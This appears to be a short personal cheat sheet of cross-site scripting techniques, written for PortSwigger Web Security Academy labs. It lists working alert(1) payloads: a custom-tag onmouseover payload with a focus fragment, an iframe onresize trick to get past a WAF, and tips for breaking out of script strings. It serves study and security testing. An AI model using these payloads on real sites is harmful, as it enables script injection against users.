### Things to Try
Standard Attack for any site
<script>alert(1)</script>

When all tags blocked except custom ones (into HTML context)
* On Portswigger, they call this the “exploit server”
* Create a page that redirects to the original site
   	* <script>location = “https://www.google.com”</script> will redirect you to the google webpage.
* SAMPLE:
   	* %3Cpotato+id%3DvErYcOoL+onmouseover%3Dalert%281%29%3E#vErYcOoL'
      		* potato = custom tag name
      		* vErYcOoL = the id of the tag
      		* #vErYcOoL = will focus on this element with the given id.
* Maybe you want to try closing the previous task by putting a "> out the front before adding another tag.

When there is a WAF & some tags blocked (into HTML context)
* Test some payloads to see which tags or attributes aren't blocked
* iframe can be used to trigger an unblocked event attribute, because the triggering attribute can belong to the iframe
* SAMPLE:
   	* <iframe src= "https://acc11fcd1ea609f0806e6a8f000600e8.web-security-academy.net/?search=<body onresize=alert(1)>" onload=this.style.width='1000px'>
   	* Send the link to a page with this script in it and it will trigger the resize function. 

When entering a javascript string with single quote/backslash escaped
* We can't add tags by closing the quote and all that jazz
* could try closing the script, opening a new one and putting your malicious code in there.

